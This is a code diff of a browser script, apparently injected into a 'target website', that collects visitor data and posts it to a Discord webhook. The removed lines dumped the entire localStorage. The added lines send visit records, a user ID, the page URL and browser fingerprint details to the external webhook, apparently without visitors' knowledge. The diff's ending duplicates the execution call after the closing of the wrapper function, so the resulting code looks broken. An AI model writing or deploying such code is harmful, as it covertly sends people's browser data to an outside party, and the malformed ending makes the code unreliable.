@@ -155,18 +155,8 @@
         return userId;
     }
 
-    // Function to collect localStorage data
-    function collectLocalStorage() {
-        const allKeys = Object.keys(localStorage);
-        const data = {};
-        allKeys.forEach(key => {
-            data[key] = localStorage.getItem(key);
-        });
-        return data;
-    }
-
-    // Collect leaderboard data using the provided script logic
-    function getLeaderboardData() {
+    // Function to collect all data into a single JSON structure
+    function collectData() {
         const visitCounts = JSON.parse(localStorage.getItem("visitCounts")) || [];
         const timeSpentOnPages = JSON.parse(localStorage.getItem("timeSpentOnPages")) || [];
         const totalVisitSummary = JSON.parse(localStorage.getItem("totalVisitSummary")) || {
@@ -178,13 +168,23 @@
             visitCounts,
             timeSpentOnPages,
             totalVisitSummary,
+            logInfo: {
+                visitTime: new Date().toISOString(),
+                page: window.location.href,
+            },
+            userData: {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+            },
         };
     }
 
-    // Function to send files to Discord webhook
-    async function sendToWebhook(files, embedMessage) {
+    // Function to send a single .json file to Discord webhook
+    async function sendToWebhook(embedMessage, consolidatedFile) {
         const formData = new FormData();
-        files.forEach(file => formData.append("file", file));
+        formData.append("file", consolidatedFile);
         formData.append(
             "payload_json",
             JSON.stringify({
@@ -193,16 +193,13 @@
         );
 
         try {
-            // Send message twice
-            for (let i = 0; i < 2; i++) {
-                const response = await fetch(webhookUrl, {
-                    method: "POST",
-                    body: formData,
-                });
-                console.log(`Message ${i + 1} sent successfully:`, await response.json());
-            }
+            const response = await fetch(webhookUrl, {
+                method: "POST",
+                body: formData,
+            });
+            console.log("Message sent successfully:", await response.json());
         } catch (error) {
-            console.error("Failed to send files:", error);
+            console.error("Failed to send file:", error);
         }
     }
 
@@ -215,52 +212,19 @@
 
         console.log("On target website.");
 
-        // Step 1: Collect localStorage content
-        const localStorageData = collectLocalStorage();
-        const localStorageFile = new File(
-            [JSON.stringify(localStorageData, null, 2)],
-            "local_storage.json",
-            { type: "application/json" }
-        );
-
-        // Step 2: Generate leaderboard JSON
-        const leaderboardData = getLeaderboardData();
-        const leaderboardFile = new File(
-            [JSON.stringify(leaderboardData, null, 2)],
-            "leaderboard.json",
-            { type: "application/json" }
-        );
-
-        // Step 3: Create log info JSON
-        const logInfo = {
-            visitTime: new Date().toISOString(),
-            page: window.location.href,
-        };
-        const logInfoFile = new File(
-            [JSON.stringify(logInfo, null, 2)],
-            "log_info.json",
-            { type: "application/json" }
-        );
-
-        // Step 4: Create user data JSON
+        // Collect all data
+        const data = collectData();
         const userId = await getUserId();
-        const userData = {
-            userId,
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            screenResolution: `${window.screen.width}x${window.screen.height}`,
-        };
-        const userDataFile = new File(
-            [JSON.stringify(userData, null, 2)],
-            "user_data.json",
+        const consolidatedFile = new File(
+            [JSON.stringify({ ...data, userId }, null, 2)],
+            "visitor_data.json",
             { type: "application/json" }
         );
 
         // Embed message with details
         const embedMessage = {
             title: "New Visitor Data",
-            description: "Collected data from a website visit.",
+            description: "Collected consolidated data from a website visit.",
             fields: [
                 { name: "User ID", value: userId },
                 { name: "Page URL", value: window.location.href },
@@ -271,12 +235,14 @@
             },
         };
 
-        // Send files and embed message to the webhook
-        sendToWebhook(
-            [localStorageFile, leaderboardFile, logInfoFile, userDataFile],
-            embedMessage
-        );
+        // Send the consolidated file and embed message to the webhook
+        sendToWebhook(embedMessage, consolidatedFile);
     }
+
+    // Execute the script
+    checkAndSendData();
+})();
+
 
     // Execute the script
     checkAndSendData();
